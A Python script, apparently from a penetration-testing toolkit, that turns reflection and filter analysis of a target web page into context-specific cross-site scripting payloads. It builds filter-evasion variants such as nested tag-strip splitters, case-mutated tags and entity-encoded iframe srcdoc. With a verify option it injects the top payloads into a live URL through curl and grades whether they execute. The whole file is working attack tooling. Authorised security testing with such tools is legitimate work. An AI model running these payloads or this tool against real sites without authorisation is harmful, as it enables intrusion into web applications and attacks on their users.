#!/usr/bin/env python3
"""
recommend_payload.py — deterministic payload recommendation.

Reads the latest *-xss_reflection_analysis.json produced by check_reflection.py
and turns it into concrete XSS payload candidates using:

  1. BREAKER computation (XSStrike htmlParser model): for each reflection
     context, derive the minimal string needed to break out of it
     (e.g. attribute -> quote + ">", JS string -> "</script>").
  2. Character efficiency gating (XSStrike checker model): every candidate
     payload is only emitted if all special characters it requires survived
     the filter (score 100 = unchanged, 50 = present but transformed, 0 = gone).
  3. Composition grammar (XSStrike genGen model): payloads are assembled from
     tag x event-handler x function x terminator primitives instead of a
     static list, so filter combinations outside the case library are covered.
  4. Marker-based DOM verification (DalFox R/V model): with --verify, the top
     payloads are actually injected with a unique marker attribute and the
     response is parsed as HTML. The payload is graded V (marker lands in an
     executable position) or R (reflected but not executable).

The curated case/ library remains the reference: each generated payload is
annotated with the case file it corresponds to (confidence 10 knowledge).
"""
import argparse
import json
import os
import re
import secrets
import string
import subprocess
import sys
from datetime import datetime
from html.parser import HTMLParser
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from log_utils import latest_log_path, new_log_path

PLACEHOLDER = "{xss_testing}"

# --- grammar primitives (XSStrike genGen model) ------------------------------

TAG_HANDLERS = [
    ("img", "onerror", "src=x", ("img_tag", "onerror", "pair_img_onerror")),
    ("svg", "onload", "", ("svg_tag", "onload", "pair_svg_onload")),
    ("details", "ontoggle", "open", ("details_tag", "ontoggle", "pair_details_ontoggle")),
    ("body", "onload", "", ("body_tag", "onload", "pair_body_onload")),
    ("iframe", "onload", "", ("iframe_tag", "onload", "pair_iframe_onload")),
]

# Nested tag-strip bypass (case "xss tag removed.md") is handled by the
# generic `splitters` machinery inside compose() below: every keyword
# item that came back deleted becomes a splitter, and any blocked
# tag/handler/function atom is rebuilt by wrapping the splitter inside it
# (<im<img>g>, on<scr>error, ...). rand_tag (<kmi> junk tag) is tried
# first -- a generic tag-stripper can split ANYTHING.

CONSUMING_TAGS = ["noscript", "style", "title", "textarea", "iframe", "script"]

# map context string fragments -> internal context key
CONTEXT_MAP = [
    ("attribute event-handler value", "attr_handler"),
    ("attribute srcdoc value", "attr_srcdoc"),
    ("attribute url value", "attr_url"),
    ("attribute value", "attr"),
    ("javascript line comment", "js_lcomment"),
    ("javascript block comment", "js_bcomment"),
    ("javascript template literal", "js_template"),
    ("javascript raw", "js_raw"),
    ("javascript string", "js_string"),
    ("inside noscript", "consuming:noscript"),
    ("inside style", "consuming:style"),
    ("inside title", "consuming:title"),
    ("inside textarea", "consuming:textarea"),
    ("inside iframe", "consuming:iframe"),
    ("inside script", "consuming:script"),
    ("html comment", "comment"),
    ("html body", "html"),
]

# curated case-library references (kept as confidence-10 knowledge source)
CASE_REF = {
    "breakout_tag": "xss inside an attribute value inside a tag without angle brackets encoded.md",
    "attr_inject": "xss inside an attribute value inside a tag.md",
    "js_breakout": "xss into javascript string without angle brackets encoded.md",
    "js_string_exec": "xss into javascript string with angle brackets encoded.md",
    "tag_breakout": "xss inside a tag.md",
    "body_direct": "xss without encoding and filtering.md",
    "gt_missing": "xss without greater than.md",
    "comment_break": "xss with consuming tags.md",
    "protocol": "xss with javascript protocol.md",
}


# --- helpers -----------------------------------------------------------------

def char_scores(results, refl_idx):
    """Per-character efficiency: 100 unchanged, 50 transformed-but-present,
    0 removed/encoded away."""
    scores = {}
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"]
        if r["passed"]:
            scores[exp] = 100
        elif exp in got:
            scores[exp] = 50
        else:
            scores[exp] = 0
    return scores


def usable(ch, scores):
    return scores.get(ch, 0) >= 100


def min_eff(payload, scores):
    """Worst efficiency among the six probe chars the payload actually uses."""
    probe = set("'\"<>/\\")
    used = [c for c in payload if c in probe]
    if not used:
        return 100
    return min(scores[c] for c in used)


def required_ok(payload, scores):
    """Gate: only emit payload if every probe char it needs scored 100."""
    probe = set("'\"<>/\\")
    return all(scores[c] == 100 for c in payload if c in probe)


def normalize_contexts(contexts):
    keys = []
    for c in contexts:
        for frag, key in CONTEXT_MAP:
            if frag in c.lower():
                keys.append(key)
                break
    return keys or ["html"]


def detect_quote(source_html, marker_full):
    """Re-parse the saved response: find which quote wraps the reflection
    when it lands inside an attribute value or JS string."""
    if not source_html or not os.path.exists(source_html):
        return '"'
    body = open(source_html, encoding="utf-8", errors="replace").read()
    esc = re.escape(marker_full)
    for q in ('"', "'", "`"):
        if re.search(r'[=(\s]' + re.escape(q) + r'[^' + re.escape(q) + r']*' + esc,
                     body, re.DOTALL):
            return q
    # unquoted attribute: =MARKER or =...MARKER
    if re.search(r'=[^\s"\'>]*' + esc, body):
        return ""
    return '"'


def breakers(ctx, quote):
    """Minimal string needed to escape the context (XSStrike 'breaker')."""
    if ctx == "html":
        return [""]
    if ctx == "attr":
        if quote == "":
            return [">", " autofocus onfocus="]
        return [quote + ">", f"{quote} autofocus onfocus={quote}"]
    if ctx == "js_string":
        return ["</script>", quote + "-"]
    if ctx in ("attr_handler", "attr_url", "attr_srcdoc", "js_raw", "js_template"):
        return [""]
    if ctx == "js_lcomment":
        return ["\n"]
    if ctx == "js_bcomment":
        return ["*/"]
    if ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        return [f"</{tag}>"]
    if ctx == "comment":
        return ["-->"]
    return [""]


def split_str(target, s):
    """Insert a filter-removed string s inside a blocked target at the
    midpoint so the filter's removal merges the halves back into target
    (split_str('<script>', '<xDh>') -> '<scr<xDh>ipt>').
    Case: xss tag removed.md — any deleted string works as a splitter,
    not just the classic <scr<script>ipt> pattern."""
    k = max(1, len(target) // 2)
    return target[:k] + s + target[k:]


def avail_funcs(kw):
    """JS call primitives allowed by the keyword mask (Layer B/C gate).
    Missing keyword analysis -> everything assumed allowed (backward compat)."""
    parens = kw.get("parentheses", True)
    btick = kw.get("backtick", True)
    funcs = []
    for name in ("alert", "confirm", "prompt"):
        if not kw.get(name, True):
            continue
        if parens and kw.get(f"call_{name}", True):
            funcs.append(f"{name}(1)")
        if btick and kw.get(f"tick_{name}", True):
            funcs.append(f"{name}`1`")
    if parens and kw.get("print", True) and kw.get("call_print", True):
        funcs.append("print()")
    if not parens and not btick and kw.get("alert", True):
        funcs.append("onerror=alert;throw 1")
    return funcs


def compose(ctx, quote, scores, kw=None, kwv=None):
    """Assemble candidate payloads from grammar primitives.
    kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
    kwv: {name: (expected, got_back)} — the actual probed strings, needed to
    build nested splitters from whatever string the filter deleted.
    Returns list of dicts: {payload, technique, case_ref, efficiency}."""
    kw = kw or {}
    kwv = kwv or {}
    funcs = avail_funcs(kw)
    out = []
    marker = "vvm{id}"

    def add(payload, technique, case_ref):
        if required_ok(payload, scores):
            out.append({
                "payload": payload,
                "technique": technique,
                "case_ref": case_ref,
                "efficiency": min_eff(payload, scores),
            })

    tags_ok = usable("<", scores) and usable(">", scores)
    slash_ok = usable("/", scores)
    q_ok = quote == "" or usable(quote, scores)
    script_ok = kw.get("script_tag", True)

    def handler_variants():
        """(tag, ev, extra) entries allowed by the keyword mask."""
        return [(t, e, x) for t, e, x, deps in TAG_HANDLERS
                if all(kw.get(d, True) for d in deps)]

    if ctx == "html":
        if tags_ok:
            # Strings the filter deleted outright (item FAILed AND its
            # reflection came back empty). Any one of them can be nested
            # inside a blocked tag/keyword: the filter deletes the splitter
            # and the fragments merge back (case: xss tag removed.md).
            # rand_tag first — when even the random junk tag was stripped the
            # filter is a generic tag-stripper that can split ANYTHING.
            splitters = sorted(
                ((n, e) for n, (e, g) in kwv.items()
                 if not kw.get(n, True) and e and g == ""),
                key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
            rsplit = [s for _, s in splitters]

            def fix(key, word, s):
                """Split word with removed string s when its kw key was
                blocked; leave it unchanged when it passed."""
                return word if kw.get(key, True) else split_str(word, s)

            def rebuild_fn(s):
                """funcs is empty -> every call primitive is blocked.
                Rebuild 'alert' via splitter s + the call syntax that
                survived; the mid-name split also breaks call_*/tick_*
                junction signatures (request never contains 'alert(1)')."""
                if kw.get("parentheses", True):
                    return [split_str("alert", s) + "(1)"]
                if kw.get("backtick", True):
                    return [split_str("alert", s) + "`1`"]
                return []

            if script_ok:
                for fn in funcs or (rebuild_fn(rsplit[0]) if rsplit else []):
                    add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
            else:
                if kw.get("case_script", True):
                    for fn in funcs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
                        add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                            "case-mutated script tag", "tag_removed")
                for s in rsplit[:3]:
                    for fn in funcs[:2] or rebuild_fn(s):
                        add(f"{split_str('<script>', s)} {marker}>{fn}"
                            f"{split_str('</script>', s)}",
                            f"nested tag-strip bypass ({s} splitter)", "tag_removed")
            for tag, ev, extra, deps in TAG_HANDLERS:
                if all(kw.get(d, True) for d in deps):
                    for fn in funcs[:2]:
                        add(f"<{tag} {extra} {marker} {ev}={fn}>".replace("  ", " "),
                            f"{tag} {ev} handler", "body_direct")
                else:
                    # Rebuild blocked atoms by nesting a removed string.
                    # When ONLY the pair_* junction failed (e.g. the WAF
                    # signs 'img onerror' while every atom passes), the tag
                    # atom is split unconditionally — otherwise the emitted
                    # payload still carries the contiguous signature and is
                    # dead on arrival. Atom-blocked cases split only the
                    # blocked atoms, keeping splitter occurrences minimal.
                    for s in rsplit[:2]:
                        atom_blocked = any(
                            not kw.get(d, True)
                            for d in deps if not d.startswith("pair_"))
                        tag_atom = fix(tag + "_tag", "<" + tag, s) \
                            if atom_blocked else split_str("<" + tag, s)
                        for fn0 in funcs[:1] or rebuild_fn(s):
                            if "=" in fn0:
                                # in-attribute fallback already carries
                                # 'onerror=' — emit it bare, tag split only
                                add(f"{tag_atom} {extra} {marker} {fn0}>"
                                    .replace("  ", " "),
                                    f"removed-string splitter ({s})", "tag_removed")
                                continue
                            fname = re.split(r"[(`]", fn0)[0]
                            add(f"{tag_atom} {extra} {marker} "
                                f"{fix(ev, ev, s)}="
                                f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
                                .replace("  ", " "),
                                f"removed-string splitter ({s})", "tag_removed")
            if kw.get("javascript_proto", True) and \
                    kw.get("proto_href", True) and funcs:
                add(f'<a {marker} href="javascript:{funcs[0]}">XSS</a>',
                    "javascript: protocol href", "protocol")
            if not kw.get("javascript_proto", True) and kw.get("case_proto", True) \
                    and funcs:
                add(f'<a {marker} href="JaVaScRiPt:{funcs[0]}">XSS</a>',
                    "case-mutated javascript: href", "protocol")
            jfns = funcs[:1] or (rebuild_fn(rsplit[0]) if rsplit else [])
            if not kw.get("javascript_proto", True) and rsplit and jfns:
                add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
                    f'{jfns[0]}">XSS</a>',
                    f"removed-string splitter ({rsplit[0]})", "tag_removed")
            if kw.get("svg_tag", True) and not kw.get("onload", True) \
                    and kw.get("case_onload", True):
                for fn in funcs[:2]:
                    add(f"<svg {marker} OnLoAd={fn}>",
                        "case-mutated onload handler", "body_direct")
            # last-resort: entity-encoded inner HTML inside iframe srcdoc.
            # Reaches the case "keywords/()/script blocked but entities pass".
            if kw.get("entity_lt", True) and kw.get("srcdoc", True) and \
                    kw.get("iframe_tag", True) and \
                    (not kw.get("parentheses", True) or not script_ok
                     or not kw.get("alert", True)):
                add(f'<iframe {marker} srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                    "iframe srcdoc entity-encoded", "special_attrs")
        elif usable("<", scores) and not usable(">", scores) and funcs:
            # "no greater-than" (case: xss without greater than.md): the
            # tag stays unterminated and the page's OWN next '>' closes
            # it. A '<tag>' keyword can only fail HERE because its '>'
            # vanished -- gating on it makes this branch unreachable, so
            # instead check the bare NAME survived via kwv got_back:
            # '<svg>' -> '<svg' means only the '>' was stripped.
            def name_ok(key):
                if kw.get(key, True):
                    return True
                e, g = kwv.get(key, ("", ""))
                return bool(e) and g == e.replace(">", "")
            for tag, ev, extra, deps in TAG_HANDLERS:
                others = [d for d in deps if d != deps[0]]
                if name_ok(deps[0]) and \
                        all(kw.get(d, True) for d in others):
                    for fn in funcs[:2]:
                        add(f"<{tag} {extra} {marker} {ev}={fn}//"
                            .replace("  ", " "),
                            f"no greater-than ({tag} {ev})", "gt_missing")

    elif ctx == "attr":
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in funcs[:2]:
                    add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
                        "attribute breakout -> tag", "breakout_tag")
            if script_ok and funcs:
                add(f'{quote}><script {marker}>{funcs[0]}</script>',
                    "attribute breakout -> script", "breakout_tag")
        elif q_ok:
            sep = quote if quote else " "
            if funcs and kw.get("autofocus", True) and kw.get("onfocus", True):
                add(f'{sep} autofocus onfocus={sep}{funcs[0]}' if quote else
                    f' autofocus onfocus={funcs[0]} accesskey=x',
                    "in-context attribute injection", "attr_inject")

    elif ctx == "attr_handler":
        # input already inside an existing on*="" handler — zero-breaker JS
        for fn in funcs:
            add(f'{fn}/*{marker}*/', "in-handler direct call", "attr_inject")
        if quote and q_ok:
            for fn in funcs[:2]:
                add(f'{quote});{fn}/*{marker}*/;//',
                    "handler close-call breakout", "breakout_tag")

    elif ctx == "attr_url":
        if kw.get("javascript_proto", True):
            for fn in funcs:
                add(f'javascript:{fn}/*{marker}*/', "javascript: URL direct", "protocol")
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in funcs[:2]:
                    add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
                        "url-attr breakout -> tag", "breakout_tag")

    elif ctx == "attr_srcdoc":
        if kw.get("entity_lt", True):
            for fn in funcs:
                add(f'&lt;script&gt;{marker}{fn}&lt;/script&gt;',
                    "srcdoc entity HTML", "special_attrs")

    elif ctx == "js_raw":
        for fn in funcs:
            add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
        for fn in funcs[:2]:
            add(f');{fn}/*{marker}*/;//', "raw JS close-call", "js_string_exec")

    elif ctx == "js_template":
        if kw.get("interp", True):
            for fn in funcs:
                add(f'${{{fn}}}/*{marker}*/', "template-literal interpolation",
                    "js_string_exec")
        if quote == "`" and q_ok:
            for fn in funcs[:2]:
                add(f'`+{fn}+`/*{marker}*/', "literal concat breakout", "js_string_exec")

    elif ctx == "js_lcomment":
        if kw.get("newline", True):
            for fn in funcs:
                add(f'\n{fn}/*{marker}*/;//', "line-comment close + exec", "js_breakout")

    elif ctx == "js_bcomment":
        if kw.get("comment_close", True):
            for fn in funcs:
                add(f'*/{fn}/*{marker}*/;//', "block-comment close + exec", "js_breakout")

    elif ctx == "js_string":
        if tags_ok and slash_ok and script_ok and kw.get("close_script", True):
            for fn in funcs[:2]:
                add(f"</script><script {marker}>{fn}</script>//",
                    "script tag breakout", "js_breakout")
        elif q_ok and quote:
            brk = "js_break_squote" if quote == "'" else \
                  "js_break_dquote" if quote == '"' else None
            for fn in funcs:
                if brk and not kw.get(brk, True):
                    continue
                add(f"{quote}-{fn}-{quote}", "in-string JS execution", "js_string_exec")

    elif ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
            if script_ok and funcs:
                add(f"</{tag}><script {marker}>{funcs[0]}</script>",
                    f"{tag} close + script", "tag_breakout")
            if kw.get("img_tag", True) and kw.get("onerror", True) and funcs:
                add(f'</{tag}><img src=x {marker} onerror={funcs[0]}>',
                    f"{tag} close + img onerror", "tag_breakout")
                add(f'<{tag}><img title="{marker}</{tag}><img src onerror={funcs[0]}>"></{tag}>',
                    f"{tag} consuming-tag trick", "comment_break")

    elif ctx == "comment":
        if tags_ok and funcs and kw.get("svg_tag", True) \
                and kw.get("onload", True) and kw.get("pair_svg_onload", True):
            add(f"--><svg {marker} onload={funcs[0]}>", "comment breakout", "comment_break")

    return out


# --- marker-based DOM verification (DalFox R/V model) -------------------------

class MarkerDomCheck(HTMLParser):
    """Walk the response; record whether the marker element sits in an
    executable position (on* handler, script body, javascript:/data: URL)."""

    def __init__(self, marker):
        super().__init__(convert_charrefs=False)
        self.marker = marker
        self.executable = False
        self.evidence = ""
        self._in_script = False

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "script":
            self._in_script = True
        joined = " ".join(str(v or "") for v in d.values())
        if self.marker not in joined and self.marker not in "".join(d.keys()):
            return
        for k, v in d.items():
            if k.startswith("on"):
                self.executable = True
                self.evidence = f"<{tag}> marker element carries event handler {k}"
            if k in ("href", "src", "action", "formaction") and v and \
                    re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
                self.executable = True
                self.evidence = f"<{tag}> marker element has executable {k} URL"
            if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
                                                 v, re.I):
                self.executable = True
                self.evidence = "marker inside <iframe srcdoc> executable HTML"
        if tag == "script":
            self.executable = True
            self.evidence = "marker inside <script> element"

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        if self._in_script and self.marker in data:
            self.executable = True
            self.evidence = "marker inside <script> body"


def verify_payload(url, payload):
    """Inject payload with marker; grade V (executable) or R (reflected)."""
    marker = "vvm" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
    marked = payload.replace("vvm{id}", marker)
    if "vvm" not in marked:
        marked += f"<!--{marker}-->"
    target = url.replace(PLACEHOLDER, quote(marked, safe=""))
    try:
        body = subprocess.run(
            ["curl", "-s", "-k", "--max-time", "15", "-A",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", target],
            capture_output=True, text=True, timeout=20).stdout
    except Exception as e:
        return {"payload": marked, "confidence": "error", "evidence": str(e)}
    if marker not in body:
        return {"payload": marked, "confidence": "none",
                "evidence": "payload not reflected"}
    chk = MarkerDomCheck(marker)
    chk.feed(body)
    grade = "V" if chk.executable else "R"
    return {"payload": marked, "confidence": grade,
            "evidence": chk.evidence or "marker reflected but not in executable position"}


# --- main --------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Recommend XSS payloads from reflection analysis")
    ap.add_argument("--analysis", help="path to *-xss_reflection_analysis.json "
                                       "(default: latest in Skills/log/)")
    ap.add_argument("--url", help="target URL with {xss_testing} placeholder "
                                  "(required for --verify)")
    ap.add_argument("--keywords", help="path to *-xss_keyword_analysis.json "
                                       "(default: latest in Skills/log/, if any)")
    ap.add_argument("--verify", action="store_true",
                    help="inject top payloads with a marker and grade R/V")
    ap.add_argument("--top", type=int, default=3,
                    help="max payload candidates per reflection (default 3)")
    args = ap.parse_args()

    print("=" * 80)
    print("Recommend Payload  (breaker -> char-gate -> grammar -> marker verify)")
    print(f"Date: {datetime.now().isoformat()}")
    print("=" * 80)

    analysis_file = args.analysis or latest_log_path("xss_reflection_analysis", "json")
    if not analysis_file or not os.path.exists(analysis_file):
        print("No reflection analysis found. Run check_reflection.py first.")
        return
    print(f"Reading analysis: {analysis_file}\n")

    analysis = json.load(open(analysis_file))
    results = analysis["results"]
    source_html = analysis.get("source_html", "")
    refl_ids = sorted({r["reflection_index"] for r in results})

    # Layer B/C keyword mask (probe2) — optional; absent = assume all allowed
    kw_file = args.keywords or latest_log_path("xss_keyword_analysis", "json")
    kw_by_refl = {}
    kwv_by_refl = {}
    if kw_file and os.path.exists(kw_file):
        kwdata = json.load(open(kw_file))
        for r in kwdata.get("results", []):
            kw_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = r["passed"]
            kwv_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = \
                (r.get("expected", ""), r.get("got_back", ""))
        print(f"Keyword mask:     {kw_file}\n")
    else:
        print("Keyword mask:     none found (run send_payloads.py --probe2 + "
              "check_reflection.py --keywords to enable Layer B/C gating)\n")

    report = {"generated_by": "recommend_payload.py",
              "generated_at": datetime.now().isoformat(),
              "source_analysis": analysis_file,
              "source_keyword_analysis": kw_file if kw_by_refl else None,
              "reflections": []}

    for rid in refl_ids:
        ctxs = [k for r in results if r["reflection_index"] == rid
                for k in normalize_contexts(r["contexts"])]
        ctx = ctxs[0]
        scores = char_scores(results, rid)
        kw = kw_by_refl.get(rid, {})
        kwv = kwv_by_refl.get(rid, {})
        quote_ch = detect_quote(source_html, "testing1")
        cand = compose(ctx, quote_ch, scores, kw, kwv)
        # rank on equal efficiency: direct payloads execute as-is;
        # splitter probes test THIS filter's actual deletion set;
        # blind mutations (case/entity) are last-resort guesses.
        # Without tiers, --top N slots get spent on probes in
        # insertion order and the working vector never gets fired.
        def tier(c):
            t = c["technique"]
            if "splitter" in t or "bypass" in t:
                return 1
            if c["case_ref"] == "tag_removed" or "case-mutated" in t \
                    or "entity" in t:
                return 2
            return 0
        cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
        cand = cand[: args.top]

        print(f"--- Reflection [{rid}]  context={ctx}  quote='{quote_ch or 'unquoted'}'")
        print(f"    char efficiency: " +
              " ".join(f"{c}={s}" for c, s in scores.items()))
        if kw:
            print(f"    keyword mask:    " +
                  " ".join(f"{k}={'OK' if v else 'BLOCKED'}" for k, v in kw.items()))
        if not cand:
            print("    [NO CANDIDATE] no payload passes the char gate -> "
                  "consult case/ manually or extend grammar")
        for i, c in enumerate(cand):
            print(f"    [{i + 1}] eff={c['efficiency']}%  {c['payload']}")
            print(f"        technique: {c['technique']}  |  case: {c['case_ref']}")

        entry = {"reflection_index": rid, "context": ctx,
                 "quote": quote_ch, "scores": scores, "keyword_mask": kw,
                 "candidates": cand}

        if args.verify and cand:
            if not args.url or PLACEHOLDER not in (args.url or ""):
                print("    [!] --verify needs --url containing {xss_testing}")
            else:
                print("    verifying top payloads...")
                verified = [verify_payload(args.url, c["payload"]) for c in cand]
                entry["verification"] = verified
                for v in verified:
                    print(f"        [{v['confidence']}] {v['payload']}")
                    print(f"            {v['evidence']}")
        print()
        report["reflections"].append(entry)

    out_file = new_log_path("xss_recommendation", "json")
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"💾 Recommendation saved to: {out_file}")


if __name__ == "__main__":
    main()
